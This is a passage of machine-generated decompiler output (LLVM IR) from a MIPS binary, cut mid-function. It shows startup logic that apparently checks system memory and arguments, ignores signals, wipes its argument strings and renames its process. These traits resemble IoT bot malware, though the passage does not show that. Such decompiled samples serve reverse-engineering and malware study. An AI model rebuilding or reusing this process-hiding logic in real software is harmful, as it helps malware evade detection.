  %s3.global-to-local = alloca i32, align 4
  %v0.global-to-local = alloca i32, align 4
  %v1_401cec = load i32, i32* @t9, align 4
  %v2_401cec = add i32 %v1_401cec, 324844
  store i32 %v2_401cec, i32* %gp.global-to-local, align 4
  %v0_401cf4 = load i32, i32* @ra, align 4
  %v0_401cf8 = load i32, i32* @s0, align 4
  %v3_401d00 = load i32, i32* @global_var_4491e8.9, align 4
  store i32 %v3_401d00, i32* @s0, align 4
  %v3_401d04 = load i32, i32* @global_var_44928c.154, align 4
  store i32 %v3_401d04, i32* @t9, align 4
  %v3_401d08 = load i32, i32* @global_var_449028.155, align 4
  %v2_401d0c = call i32 @function_404b10(i32 %v3_401d08)
  store i32 %v2_401cec, i32* %gp.global-to-local, align 4
  %v3_401d1c = load i32, i32* @global_var_4491e8.9, align 4
  %v3_401d20 = load i32, i32* @global_var_449284.12, align 4
  store i32 %v3_401d20, i32* @t9, align 4
  %v3_401d24 = load i32, i32* @global_var_449518.156, align 4
  store i32 -1, i32* @global_var_449028.155, align 4
  store i32 %v3_401d1c, i32* @v0, align 4
  %v1_401d38 = icmp eq i32 %v3_401d24, 0
  store i8 0, i8* @global_var_449514.157, align 1
  br i1 %v1_401d38, label %dec_label_pc_401d50, label %dec_label_pc_401d3c

dec_label_pc_401d3c:                              ; preds = %dec_label_pc_401ce4
  %v2_401d40 = call i32 @function_406080(i32 %v3_401d24)
  store i32 %v2_401d40, i32* @v0, align 4
  store i32 %v2_401cec, i32* %gp.global-to-local, align 4
  br label %dec_label_pc_401d50

dec_label_pc_401d50:                              ; preds = %dec_label_pc_401ce4, %dec_label_pc_401d3c
  %v3_401d50 = load i32, i32* @global_var_449454.5, align 4
  store i32 %v3_401d50, i32* @t9, align 4
  store i32 %v0_401cf4, i32* @ra, align 4
  store i32 %v0_401cf8, i32* %s0.global-to-local, align 4
  %v5_401d60 = call i32 @function_406580(i32 10)
  store i32 %v5_401d60, i32* %v0.global-to-local, align 4
  %v1_401d70 = load i32, i32* @t9, align 4
  %v2_401d70 = add i32 %v1_401d70, 324712
  store i32 %v2_401d70, i32* %gp.global-to-local, align 4
  %v0_401d7c = load i32, i32* @s3, align 4
  %v0_401d84 = load i32, i32* @s1, align 4
  %v0_401d88 = load i32, i32* @s0, align 4
  store i32 1, i32* %s3.global-to-local, align 4
  %v1_401d94 = add i32 %v1_401d70, 292572
  %v2_401d94 = inttoptr i32 %v1_401d94 to i32*
  %v3_401d94 = load i32, i32* %v2_401d94, align 4
  %v1_401da0 = add i32 %v1_401d70, 291968
  %v2_401da0 = inttoptr i32 %v1_401da0 to i32*
  %v3_401da0 = load i32, i32* %v2_401da0, align 4
  store i32 %v3_401da0, i32* %s0.global-to-local, align 4
  call void @__pseudo_call(i32 %v3_401d94)
  store i32 %v2_401d70, i32* %gp.global-to-local, align 4
  store i32 1, i32* %s1.global-to-local, align 4
  %v1_401db8 = add i32 %v1_401d70, 292436
  %v2_401db8 = inttoptr i32 %v1_401db8 to i32*
  %v3_401db8 = load i32, i32* %v2_401db8, align 4
  %v2_401dcc = icmp eq i32 %v5_401d60, -1
  %v4_401dcc = load i32, i32* %s0.global-to-local, align 4
  %v5_401dcc = add i32 %v4_401dcc, -28636
  %v6_401dcc = inttoptr i32 %v5_401dcc to i32*
  store i32 %v5_401d60, i32* %v6_401dcc, align 4
  br i1 %v2_401dcc, label %dec_label_pc_401e9c, label %dec_label_pc_401dd0

dec_label_pc_401dd0:                              ; preds = %dec_label_pc_401d50
  store i32 4, i32* %v0.global-to-local, align 4
  call void @__pseudo_call(i32 %v3_401db8)
  store i32 %v2_401d70, i32* %gp.global-to-local, align 4
  %v0_401de8 = load i32, i32* %s0.global-to-local, align 4
  %v1_401de8 = add i32 %v0_401de8, -28636
  %v2_401de8 = inttoptr i32 %v1_401de8 to i32*
  %v3_401de8 = load i32, i32* %v2_401de8, align 4
  store i32 %v3_401de8, i32* %s0.global-to-local, align 4
  %v1_401dec = add i32 %v1_401d70, 292140
  %v2_401dec = inttoptr i32 %v1_401dec to i32*
  %v3_401dec = load i32, i32* %v2_401dec, align 4
  call void @__pseudo_call(i32 %v3_401dec)
  store i32 %v2_401d70, i32* %gp.global-to-local, align 4
  %v3_401e08 = load i32, i32* %v2_401dec, align 4
  call void @__pseudo_call(i32 %v3_401e08)
  store i32 16777216, i32* %v0.global-to-local, align 4
  store i32 %v2_401d70, i32* %gp.global-to-local, align 4
  %v0_401e20 = load i32, i32* %s3.global-to-local, align 4
  %v1_401e20 = load i32, i32* %s1.global-to-local, align 4
  %v2_401e20 = icmp eq i32 %v0_401e20, %v1_401e20
  br i1 %v2_401e20, label %dec_label_pc_401e34, label %dec_label_pc_401e24

dec_label_pc_401e24:                              ; preds = %dec_label_pc_401dd0
  %v1_401e28 = add i32 %v1_401d70, 292648
  %v2_401e28 = inttoptr i32 %v1_401e28 to i32*
  %v3_401e28 = load i32, i32* %v2_401e28, align 4
  store i32 %v3_401e28, i32* %v0.global-to-local, align 4
  br label %dec_label_pc_401e34

dec_label_pc_401e34:                              ; preds = %dec_label_pc_401dd0, %dec_label_pc_401e24
  store i32 2, i32* %v0.global-to-local, align 4
  %v1_401e38 = add i32 %v1_401d70, 292216
  %v2_401e38 = inttoptr i32 %v1_401e38 to i32*
  %v3_401e38 = load i32, i32* %v2_401e38, align 4
  store i32 -16350, i32* %v0.global-to-local, align 4
  call void @__pseudo_call(i32 %v3_401e38)
  store i32 %v2_401d70, i32* %gp.global-to-local, align 4
  store i32 0, i32* inttoptr (i32 -16350 to i32*), align 4
  %v1_401e58 = add i32 %v1_401d70, 291968
  %v2_401e58 = inttoptr i32 %v1_401e58 to i32*
  %v3_401e58 = load i32, i32* %v2_401e58, align 4
  store i32 %v3_401e58, i32* %s1.global-to-local, align 4
  %v1_401e5c = add i32 %v1_401d70, 292468
  %v2_401e5c = inttoptr i32 %v1_401e5c to i32*
  %v3_401e5c = load i32, i32* %v2_401e5c, align 4
  %v1_401e70 = load i32, i32* %v0.global-to-local, align 4
  store i32 %v1_401e70, i32* %s0.global-to-local, align 4
  call void @__pseudo_call(i32 %v3_401e5c)
  store i32 %v2_401d70, i32* %gp.global-to-local, align 4
  %v1_401e7c = icmp eq i32 %v1_401e70, 0
  store i32 126, i32* %v0.global-to-local, align 4
  br i1 %v1_401e7c, label %dec_label_pc_401e34.dec_label_pc_401eb8_crit_edge, label %dec_label_pc_401e80

dec_label_pc_401e34.dec_label_pc_401eb8_crit_edge: ; preds = %dec_label_pc_401e34
  %v0_401eb8.pre = load i32, i32* %s3.global-to-local, align 4
  br label %dec_label_pc_401eb8

dec_label_pc_401e80:                              ; preds = %dec_label_pc_401e34
  %v0_401e84 = load i32, i32* %s0.global-to-local, align 4
  %v1_401e84 = inttoptr i32 %v0_401e84 to i32*
  %v2_401e84 = load i32, i32* %v1_401e84, align 4
  %v2_401e8c = icmp eq i32 %v2_401e84, 126
  store i32 13, i32* %v0.global-to-local, align 4
  br i1 %v2_401e8c, label %dec_label_pc_401e9c, label %dec_label_pc_401e90

dec_label_pc_401e90:                              ; preds = %dec_label_pc_401e80
  %v2_401e94 = icmp eq i32 %v2_401e84, 13
  br i1 %v2_401e94, label %dec_label_pc_401e9c, label %dec_label_pc_401ee4

dec_label_pc_401e9c:                              ; preds = %dec_label_pc_401e90, %dec_label_pc_401e80, %dec_label_pc_401d50
  %v0_401e9c = load i32, i32* %s3.global-to-local, align 4
  %v1_401e9c = add i32 %v0_401e9c, 1
  %v1_401ea0 = urem i32 %v1_401e9c, 256
  store i32 %v1_401ea0, i32* %s3.global-to-local, align 4
  %v2_401ea8 = icmp eq i32 %v1_401ea0, 3
  store i32 0, i32* %v0.global-to-local, align 4
  br i1 %v2_401ea8, label %dec_label_pc_401f68, label %dec_label_pc_401eb8

dec_label_pc_401eb8:                              ; preds = %dec_label_pc_401e34.dec_label_pc_401eb8_crit_edge, %dec_label_pc_401e9c
  %v0_401eb8 = phi i32 [ %v0_401eb8.pre, %dec_label_pc_401e34.dec_label_pc_401eb8_crit_edge ], [ %v1_401ea0, %dec_label_pc_401e9c ]
  %v1_401eb8 = icmp ult i32 %v0_401eb8, 2
  %v2_401eb8 = zext i1 %v1_401eb8 to i32
  store i32 %v2_401eb8, i32* %v0.global-to-local, align 4
  %v1_401ebc = icmp eq i1 %v1_401eb8, false
  br i1 %v1_401ebc, label %dec_label_pc_401f64, label %dec_label_pc_401ec0

dec_label_pc_401ec0:                              ; preds = %dec_label_pc_401eb8
  %v0_401ec4 = load i32, i32* %gp.global-to-local, align 4
  %v1_401ec4 = add i32 %v0_401ec4, -32332
  %v2_401ec4 = inttoptr i32 %v1_401ec4 to i32*
  %v3_401ec4 = load i32, i32* %v2_401ec4, align 4
  call void @__pseudo_call(i32 %v3_401ec4)
  %v0_401ed4 = load i32, i32* %v0.global-to-local, align 4
  store i32 %v2_401d70, i32* %gp.global-to-local, align 4
  %v1_401ee0 = icmp ne i32 %v0_401ed4, -1
  %v2_401ee0 = zext i1 %v1_401ee0 to i32
  store i32 %v2_401ee0, i32* %v0.global-to-local, align 4
  br label %dec_label_pc_401ee4

dec_label_pc_401ee4:                              ; preds = %dec_label_pc_401e90, %dec_label_pc_401ec0
  %v1_401ee4 = add i32 %v1_401d70, 292672
  %v2_401ee4 = inttoptr i32 %v1_401ee4 to i32*
  %v3_401ee4 = load i32, i32* %v2_401ee4, align 4
  call void @__pseudo_call(i32 %v3_401ee4)
  store i32 %v2_401d70, i32* %gp.global-to-local, align 4
  %v1_401efc = add i32 %v1_401d70, 292588
  %v2_401efc = inttoptr i32 %v1_401efc to i32*
  %v3_401efc = load i32, i32* %v2_401efc, align 4
  call void @__pseudo_call(i32 %v3_401efc)
  store i32 %v2_401d70, i32* %gp.global-to-local, align 4
  %v1_401f14 = add i32 %v1_401d70, 292132
  %v2_401f14 = inttoptr i32 %v1_401f14 to i32*
  %v3_401f14 = load i32, i32* %v2_401f14, align 4
  call void @__pseudo_call(i32 %v3_401f14)
  store i32 %v2_401d70, i32* %gp.global-to-local, align 4
  %v1_401f2c = add i32 %v1_401d70, 292612
  %v2_401f2c = inttoptr i32 %v1_401f2c to i32*
  %v3_401f2c = load i32, i32* %v2_401f2c, align 4
  call void @__pseudo_call(i32 %v3_401f2c)
  store i32 %v2_401d70, i32* %gp.global-to-local, align 4
  %v1_401f44 = add i32 %v1_401d70, 291976
  %v2_401f44 = inttoptr i32 %v1_401f44 to i32*
  %v3_401f44 = load i32, i32* %v2_401f44, align 4
  %v1_401f4c = add i32 %v3_401f44, 7528
  call void @__pseudo_call(i32 %v1_401f4c)
  store i32 %v2_401d70, i32* %gp.global-to-local, align 4
  store i32 1, i32* %v0.global-to-local, align 4
  br label %dec_label_pc_401f64

dec_label_pc_401f64:                              ; preds = %dec_label_pc_401eb8, %dec_label_pc_401ee4
  store i32 0, i32* %v0.global-to-local, align 4
  br label %dec_label_pc_401f68

dec_label_pc_401f68:                              ; preds = %dec_label_pc_401e9c, %dec_label_pc_401f64
  store i32 %v0_401d7c, i32* %s3.global-to-local, align 4
  store i32 %v0_401d84, i32* %s1.global-to-local, align 4
  store i32 %v0_401d88, i32* %s0.global-to-local, align 4
  ret i32 0

; uselistorder directives
  uselistorder i32 %v1_401ea0, { 2, 1, 0 }
  uselistorder i32 %v2_401d70, { 6, 5, 4, 3, 2, 1, 11, 10, 9, 8, 7, 0, 12 }
  uselistorder i32 %v1_401d70, { 2, 3, 4, 5, 6, 0, 1, 7, 8, 9, 10, 11, 12, 13 }
  uselistorder i32 %v3_401d24, { 1, 0 }
  uselistorder i32 %v2_401cec, { 1, 0, 2 }
  uselistorder i32* %v0.global-to-local, { 0, 1, 2, 3, 4, 5, 7, 6, 8, 9, 10, 11, 12, 13, 14 }
  uselistorder i32* %s3.global-to-local, { 0, 1, 2, 4, 3, 5 }
  uselistorder i32* %gp.global-to-local, { 0, 1, 2, 3, 4, 5, 11, 6, 7, 8, 9, 10, 12, 13, 14, 15, 16 }
  uselistorder i32 13, { 1, 3, 0, 4, 2, 5 }
  uselistorder label %dec_label_pc_401f68, { 1, 0 }
  uselistorder label %dec_label_pc_401f64, { 1, 0 }
  uselistorder label %dec_label_pc_401ee4, { 1, 0 }
  uselistorder label %dec_label_pc_401eb8, { 1, 0 }
  uselistorder label %dec_label_pc_401e34, { 1, 0 }
  uselistorder label %dec_label_pc_401d50, { 1, 0 }
}

define i32 @function_401f84(i32 %arg1, i32* %arg2) local_unnamed_addr {
dec_label_pc_401f84:
  %a1.global-to-local = alloca i32, align 4
  %a2.global-to-local = alloca i32, align 4
  %a3.global-to-local = alloca i32, align 4
  %s1.global-to-local = alloca i32, align 4
  %v0.global-to-local = alloca i32, align 4
  %v1.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i32* %arg2 to i32
  store i32 %tmp, i32* %a1.global-to-local, align 4
  %stack_var_-996 = alloca i32, align 4
  %stack_var_-992 = alloca i32, align 4
  %stack_var_-988 = alloca i32, align 4
  %stack_var_-1000 = alloca i16, align 2
  %stack_var_-980 = alloca i32, align 4
  %stack_var_-548 = alloca i32, align 4
  %stack_var_-676 = alloca i32, align 4
  %stack_var_-804 = alloca i32, align 4
  %stack_var_-964 = alloca i32, align 4
  %stack_var_-900 = alloca i32, align 4
  %stack_var_-932 = alloca i32, align 4
  %stack_var_-868 = alloca i32, align 4
  %v1_401f8c = load i32, i32* @t9, align 4
  %v2_401f8c = add i32 %v1_401f8c, 324172
  %v0_401fa8 = load i32, i32* @s1, align 4
  %v3_401fb4 = load i32, i32* @global_var_449450.170, align 4
  store i32 %v3_401fb4, i32* @t9, align 4
  store i32 %arg1, i32* @s5, align 4
  store i32 %tmp, i32* @s3, align 4
  %v3_401fc0 = bitcast i32* %stack_var_-868 to %sysinfo*
  %v4_401fc0 = call i32 @function_405080(%sysinfo* %v3_401fc0)
  store i32 %v4_401fc0, i32* %v0.global-to-local, align 4
  %v3_401fd0 = load i32, i32* @global_var_4493a8.171, align 4
  store i32 %v3_401fd0, i32* @t9, align 4
  %v1_401fd8 = call i32 @function_402a88()
  store i32 %v1_401fd8, i32* %v0.global-to-local, align 4
  %v3_401fe8 = load i32, i32* @global_var_449288.172, align 4
  store i32 %v3_401fe8, i32* @t9, align 4
  %v1_401ff0 = call i32 @function_401104()
  store i32 2, i32* @v0, align 4
  %v0_402000 = load i32, i32* @s5, align 4
  %v2_402000 = icmp eq i32 %v0_402000, 2
  store i32 1, i32* @s4, align 4
  br i1 %v2_402000, label %dec_label_pc_402004, label %dec_label_pc_402050

dec_label_pc_402004:                              ; preds = %dec_label_pc_401f84
  %v0_402008 = load i32, i32* @s3, align 4
  %v1_402008 = add i32 %v0_402008, 4
  %v2_402008 = inttoptr i32 %v1_402008 to i32*
  %v3_402008 = load i32, i32* %v2_402008, align 4
  store i32 %v3_402008, i32* @s0, align 4
  %v3_402014 = call i32 @function_40434c(i32 %v3_402008)
  store i32 %v3_402014, i32* %v0.global-to-local, align 4
  %v0_402020 = load i32, i32* @s0, align 4
  store i32 %v3_402014, i32* %a1.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_408330.175 to i32), i32* %a2.global-to-local, align 4
  store i32 1, i32* %a3.global-to-local, align 4
  %v5_402034 = call i32 @function_404550(i32 %v0_402020, i32 %v3_402014, i32 ptrtoint (i32* @global_var_408330.175 to i32), i32 1)
  store i32 %v5_402034, i32* %v0.global-to-local, align 4
  store i32 -1, i32* %v1.global-to-local, align 4
  %v2_402044 = icmp eq i32 %v5_402034, -1
  %. = zext i1 %v2_402044 to i32
  store i32 %., i32* @s4, align 4
  br label %dec_label_pc_402050

dec_label_pc_402050:                              ; preds = %dec_label_pc_402004, %dec_label_pc_401f84
  %v0_402050 = load i32, i32* @s1, align 4
  %v1_402054 = icmp ult i32 %v0_402050, 2097152
  %v2_402054 = zext i1 %v1_402054 to i32
  store i32 %v2_402054, i32* %v0.global-to-local, align 4
  %v1_402058 = icmp eq i1 %v1_402054, false
  br i1 %v1_402058, label %dec_label_pc_402064, label %dec_label_pc_40205c

dec_label_pc_40205c:                              ; preds = %dec_label_pc_402050
  store i32 0, i32* @s4, align 4
  br label %dec_label_pc_402064

dec_label_pc_402064:                              ; preds = %dec_label_pc_402050, %dec_label_pc_40205c
  %v3_402064 = load i32, i32* @global_var_449390.176, align 4
  store i32 %v3_402064, i32* @t9, align 4
  %v0_402068 = load i32, i32* @s3, align 4
  %v1_402068 = inttoptr i32 %v0_402068 to i32*
  %v2_402068 = load i32, i32* %v1_402068, align 4
  %v2_40206c = inttoptr i32 %v2_402068 to i8*
  %v3_40206c = call i32 @function_405140(i8* %v2_40206c)
  store i32 %v3_40206c, i32* %v0.global-to-local, align 4
  %v3_40207c = load i32, i32* @global_var_4493a0.57, align 4
  store i32 %v3_40207c, i32* @t9, align 4
  store i32 1, i32* %a1.global-to-local, align 4
  %v3_402084 = call i32 @function_405c40(i32 1, i32 1)
  store i32 %v3_402084, i32* %v0.global-to-local, align 4
  %v3_402094 = load i32, i32* @global_var_4493a0.57, align 4
  store i32 %v3_402094, i32* @t9, align 4
  store i32 1, i32* %a1.global-to-local, align 4
  %v3_40209c = call i32 @function_405c40(i32 18, i32 1)
  store i32 %v3_40209c, i32* %v0.global-to-local, align 4
  %v3_4020ac = load i32, i32* @global_var_449344.177, align 4
  store i32 %v3_4020ac, i32* @t9, align 4
  store i32 0, i32* %a1.global-to-local, align 4
  store i32 0, i32* %a2.global-to-local, align 4
  store i32 0, i32* %a3.global-to-local, align 4
  %v5_4020b8 = call i32 @function_404e10(i32 0, i32 0, i32 0, i32 0)
  store i32 %v5_4020b8, i32* %v0.global-to-local, align 4
  store i32 -1, i32* %v1.global-to-local, align 4
  %v2_4020c8 = icmp eq i32 %v5_4020b8, -1
  br i1 %v2_4020c8, label %dec_label_pc_4020cc, label %dec_label_pc_40217c

dec_label_pc_4020cc:                              ; preds = %dec_label_pc_402064
  %v3_4020d0 = load i32, i32* @global_var_44932c.178, align 4
  store i32 %v3_4020d0, i32* @t9, align 4
  %v2_4020d8 = call i32 @function_400d04(i32 28)
  store i32 %v2_4020d8, i32* %v0.global-to-local, align 4
  %v3_4020e8 = load i32, i32* @global_var_449480.179, align 4
  store i32 %v3_4020e8, i32* @t9, align 4
  %v2_4020f0 = call i32 @function_400f98(i32 28)
  store i32 %v2_4020f0, i32* %v0.global-to-local, align 4
  %v3_402100 = load i32, i32* @global_var_449480.179, align 4
  store i32 %v3_402100, i32* @t9, align 4
  store i32 %v2_4020f0, i32* @s0, align 4
  %v3_402108 = call i32 @function_400f98(i32 28)
  store i32 %v3_402108, i32* @v0, align 4
  %v3_402120 = call i32 @function_40434c(i32 %v3_402108)
  store i32 %v3_402120, i32* %v0.global-to-local, align 4
  %v0_40212c = load i32, i32* @s0, align 4
  store i32 %v0_40212c, i32* %a1.global-to-local, align 4
  %v3_402130 = load i32, i32* @global_var_4493e8.180, align 4
  store i32 %v3_402130, i32* @t9, align 4
  store i32 %v3_402120, i32* %a2.global-to-local, align 4
  %v4_402138 = inttoptr i32 %v0_40212c to i32*
  %v5_402138 = call i32 @function_4051a0(i32 1, i32* %v4_402138, i32 %v3_402120)
  store i32 %v5_402138, i32* %v0.global-to-local, align 4
  %v3_40214c = load i32, i32* @global_var_4493e8.180, align 4
  store i32 %v3_40214c, i32* @t9, align 4
  store i32 ptrtoint (i32* @global_var_408398.181 to i32), i32* %a1.global-to-local, align 4
  store i32 1, i32* %a2.global-to-local, align 4
  %v5_402154 = call i32 @function_4051a0(i32 1, i32* nonnull @global_var_408398.181, i32 1)
  store i32 %v5_402154, i32* %v0.global-to-local, align 4
  %v3_402164 = load i32, i32* @global_var_449404.182, align 4
  store i32 %v3_402164, i32* @t9, align 4
  %v2_40216c = call i32 @function_400e4c(i32 28)
  store i32 %v2_40216c, i32* %v0.global-to-local, align 4
  br label %dec_label_pc_40217c

dec_label_pc_40217c:                              ; preds = %dec_label_pc_402064, %dec_label_pc_4020cc
  %v3_402180 = load i32, i32* @global_var_4493c0.183, align 4
  store i32 %v3_402180, i32* @t9, align 4
  %v5_402188 = call i32 @function_404ab0(i8* getelementptr inbounds ([2 x i8], [2 x i8]* @global_var_4082b8.184, i32 0, i32 0))
  store i32 %v5_402188, i32* %v0.global-to-local, align 4
  %v3_402198 = load i32, i32* @global_var_44948c.185, align 4
  store i32 %v3_402198, i32* @t9, align 4
  %v1_4021a0 = call i32 @function_404834()
  store i32 %v1_4021a0, i32* %v0.global-to-local, align 4
  %v1_4021b0 = add i32 %v1_401f8c, 292108
  %v2_4021b0 = inttoptr i32 %v1_4021b0 to i32*
  %v3_4021b0 = load i32, i32* %v2_4021b0, align 4
  store i32 %v3_4021b0, i32* %v1.global-to-local, align 4
  %v3_4021b4 = load i32, i32* @global_var_449380.4, align 4
  store i32 %v3_4021b4, i32* @t9, align 4
  %v3_4021bc = inttoptr i32 %v3_4021b0 to i32*
  store i32 %v1_4021a0, i32* %v3_4021bc, align 4
  %v4_4021bc = call i32 @function_404b70()
  %v1_4021c8 = icmp sgt i32 %v4_4021bc, 0
  store i32 0, i32* %v0.global-to-local, align 4
  br i1 %v1_4021c8, label %dec_label_pc_402954, label %dec_label_pc_4021cc

dec_label_pc_4021cc:                              ; preds = %dec_label_pc_40217c
  %v3_4021d0 = load i32, i32* @global_var_4492a0.188, align 4
  store i32 %v3_4021d0, i32* @t9, align 4
  %v1_4021d4 = add i32 %v1_401f8c, 291700
  %v2_4021d4 = inttoptr i32 %v1_4021d4 to i32*
  %v3_4021d4 = load i32, i32* %v2_4021d4, align 4
  store i32 %v3_4021d4, i32* @s1, align 4
  %v1_4021d8 = call i32 @function_405020()
  store i32 %v1_4021d8, i32* %v0.global-to-local, align 4
  %v3_4021e8 = load i32, i32* @global_var_44928c.154, align 4
  store i32 %v3_4021e8, i32* @t9, align 4
  %v2_4021f0 = load i32, i32* @s1, align 4
  %v3_4021f0 = inttoptr i32 %v2_4021f0 to i32*
  store i32 %v1_4021d8, i32* %v3_4021f0, align 4
  %v5_4021f0 = call i32 @function_404b10(i32 0)
  store i32 %v5_4021f0, i32* %v0.global-to-local, align 4
  %v3_402200 = load i32, i32* @global_var_44928c.154, align 4
  store i32 %v3_402200, i32* @t9, align 4
  %v2_402208 = call i32 @function_404b10(i32 2)
  store i32 %v2_402208, i32* %v0.global-to-local, align 4
  %v3_402218 = load i32, i32* @global_var_44928c.154, align 4
  store i32 %v3_402218, i32* @t9, align 4
  %v2_402220 = call i32 @function_404b10(i32 1)
  store i32 %v2_402220, i32* %v0.global-to-local, align 4
  store i32 0, i32* %a3.global-to-local, align 4
  %v3_402230 = load i32, i32* @global_var_449344.177, align 4
  store i32 %v3_402230, i32* @t9, align 4
  store i32 0, i32* %a1.global-to-local, align 4
  store i32 0, i32* %a2.global-to-local, align 4
  %v5_40223c = call i32 @function_404e10(i32 0, i32 0, i32 0, i32 0)
  store i32 %v5_40223c, i32* %v0.global-to-local, align 4
  store i32 0, i32* %a1.global-to-local, align 4
  store i32 32, i32* %a2.global-to-local, align 4
  %v8_402254 = call i32 @function_405660(i32* nonnull %stack_var_-932, i32 0, i32 32)
  store i32 40, i32* %v0.global-to-local, align 4
  %v0_402260 = load i32, i32* @s3, align 4
  %v1_402260 = inttoptr i32 %v0_402260 to i32*
  %v2_402260 = load i32, i32* %v1_402260, align 4
  store i32 %v2_402260, i32* @s0, align 4
  store i32 40, i32* %stack_var_-932, align 4
  store i32 41, i32* @v1, align 4
  store i32 109, i32* @v0, align 4
  store i32 46, i32* %stack_var_-900, align 4
  %v5_4022a4 = call i32 @function_40434c(i32 %v2_402260)
  store i32 %v5_4022a4, i32* %v0.global-to-local, align 4
  %v0_4022b0 = load i32, i32* @s0, align 4
  store i32 %v0_4022b0, i32* %a2.global-to-local, align 4
  store i32 %v5_4022a4, i32* %a3.global-to-local, align 4
  %v2_4022bc = ptrtoint i32* %stack_var_-900 to i32
  store i32 4, i32* %a1.global-to-local, align 4
  %v5_4022c0 = call i32 @function_404550(i32 %v2_4022bc, i32 4, i32 %v0_4022b0, i32 %v5_4022a4)
  %v1_4022c8 = add i32 %v5_4022c0, 1
  store i32 %v1_4022c8, i32* @v0, align 4
  %v1_4022d0 = icmp eq i32 %v1_4022c8, 0
  br i1 %v1_4022d0, label %dec_label_pc_4022d8, label %dec_label_pc_402304

dec_label_pc_4022d8:                              ; preds = %dec_label_pc_4021cc, %dec_label_pc_402304
  %v0_4022d8 = load i32, i32* @s1, align 4
  %v1_4022d8 = inttoptr i32 %v0_4022d8 to i32*
  %v2_4022d8 = load i32, i32* %v1_4022d8, align 4
  %v3_4022dc = load i32, i32* @global_var_4493e4.7, align 4
  store i32 %v3_4022dc, i32* @t9, align 4
  %v1_4022e0 = sub i32 0, %v2_4022d8
  store i32 9, i32* %a1.global-to-local, align 4
  %v3_4022e4 = call i32 @function_404c90(i32 %v1_4022e0, i32 9)
  store i32 %v3_4022e4, i32* @v0, align 4
  %v3_4022f4 = load i32, i32* @global_var_4492dc.8, align 4
  store i32 %v3_4022f4, i32* @t9, align 4
  %v2_4022fc = call i32 @function_406490(i32 0)
  store i32 %v2_4022fc, i32* @v0, align 4
  br label %dec_label_pc_402304

dec_label_pc_402304:                              ; preds = %dec_label_pc_4021cc, %dec_label_pc_4022d8
  %v3_402304 = load i32, i32* bitcast (i32** @global_var_4491f0.18 to i32*), align 4
  %v1_40230c = add i32 %v3_402304, 7528
  store i32 ptrtoint (i32* @global_var_402318.193 to i32), i32* @ra, align 4
  call void @__pseudo_call(i32 %v1_40230c)
  %v0_40231c = load i32, i32* @v0, align 4
  %v1_40231c = icmp eq i32 %v0_40231c, 0
  store i32 0, i32* @s2, align 4
  br i1 %v1_40231c, label %dec_label_pc_4022d8, label %dec_label_pc_402320

dec_label_pc_402320:                              ; preds = %dec_label_pc_402304
  %v0_402328 = load i32, i32* @s3, align 4
  store i32 %v0_402328, i32* %s1.global-to-local, align 4
  br label %dec_label_pc_40232c

dec_label_pc_40232c:                              ; preds = %dec_label_pc_40232c, %dec_label_pc_402320
  %v0_40232c = phi i32 [ %v3_402364, %dec_label_pc_40232c ], [ %v0_402328, %dec_label_pc_402320 ]
  %v1_40232c = add i32 %v0_40232c, -4
  %v2_40232c = inttoptr i32 %v1_40232c to i32*
  %v3_40232c = load i32, i32* %v2_40232c, align 4
  %v3_402338 = call i32 @function_40434c(i32 %v3_40232c)
  store i32 %v3_402338, i32* %v0.global-to-local, align 4
  store i32 %v3_40232c, i32* @a0, align 4
  store i32 %v3_402338, i32* @a2, align 4
  store i32 0, i32* %a1.global-to-local, align 4
  %v4_402350 = call i32 @function_404434(i32 %v3_40232c, i32 0, i32 %v3_402338)
  %v0_40235c = load i32, i32* @s2, align 4
  %v1_40235c = add i32 %v0_40235c, 1
  store i32 %v1_40235c, i32* @s2, align 4
  %v1_402360 = load i32, i32* @s5, align 4
  %v2_402360 = icmp slt i32 %v1_40235c, %v1_402360
  %v3_402360 = zext i1 %v2_402360 to i32
  store i32 %v3_402360, i32* @v0, align 4
  %v2_402364 = load i32, i32* %s1.global-to-local, align 4
  %v3_402364 = add i32 %v2_402364, 4
  store i32 %v3_402364, i32* %s1.global-to-local, align 4
  br i1 %v2_402360, label %dec_label_pc_40232c, label %dec_label_pc_402368

dec_label_pc_402368:                              ; preds = %dec_label_pc_40232c
  %v3_40236c = load i32, i32* @global_var_449414.195, align 4
  store i32 %v3_40236c, i32* @t9, align 4
  %v3_402374 = ptrtoint i32* %stack_var_-964 to i32
  store i32 %v3_402374, i32* @s1, align 4
  %v4_402374 = call i32 @function_402978()
  store i32 %v4_402374, i32* %v0.global-to-local, align 4
  %v1_40237c = mul i32 %v4_402374, 4
  %v1_402384 = and i32 %v1_40237c, 12
  %v3_402388 = load i32, i32* @global_var_44940c.196, align 4
  store i32 %v3_402388, i32* @t9, align 4
  %v1_40238c = add nuw nsw i32 %v1_402384, 12
  store i32 %v1_40238c, i32* @s0, align 4
  store i32 %v1_40238c, i32* %a1.global-to-local, align 4
  %v4_402394 = bitcast i32* %stack_var_-964 to i8*
  %v5_402394 = call i32 @function_4029d4(i8* %v4_402394, i32 %v1_40238c)
  %v0_4023a0 = load i32, i32* @sp, align 4
  %v1_4023a0 = load i32, i32* @s0, align 4
  %v2_4023a0 = add i32 %v1_4023a0, %v0_4023a0
  store i32 %v2_4023a0, i32* %v0.global-to-local, align 4
  %v3_4023a4 = load i32, i32* @global_var_449468.197, align 4
  store i32 %v3_4023a4, i32* @t9, align 4
  store i32 %v3_402374, i32* %a1.global-to-local, align 4
  %v2_4023b0 = add i32 %v2_4023a0, 68
  %v3_4023b0 = inttoptr i32 %v2_4023b0 to i8*
  store i8 0, i8* %v3_4023b0, align 1
  %v6_4023b0 = call i32 @function_404d90(i32 15, i32 %v3_402374)
  store i32 %v6_4023b0, i32* %v0.global-to-local, align 4
  %v0_4023bc = load i32, i32* @s3, align 4
  %v1_4023bc = inttoptr i32 %v0_4023bc to i32*
  %v2_4023bc = load i32, i32* %v1_4023bc, align 4
  %v3_4023c4 = load i32, i32* @global_var_4492ec.198, align 4
  store i32 %v3_4023c4, i32* @t9, align 4
  store i32 ptrtoint ([4 x i8]* @global_var_40839c.199 to i32), i32* %a1.global-to-local, align 4
  %v7_4023cc = inttoptr i32 %v2_4023bc to i8*
  %v8_4023cc = call i32 @function_4043d0(i8* %v7_4023cc, i32 ptrtoint ([4 x i8]* @global_var_40839c.199 to i32))
  store i32 %v8_4023cc, i32* %v0.global-to-local, align 4
  %v0_4023d8 = load i32, i32* @s4, align 4
  %v1_4023d8 = icmp eq i32 %v0_4023d8, 0
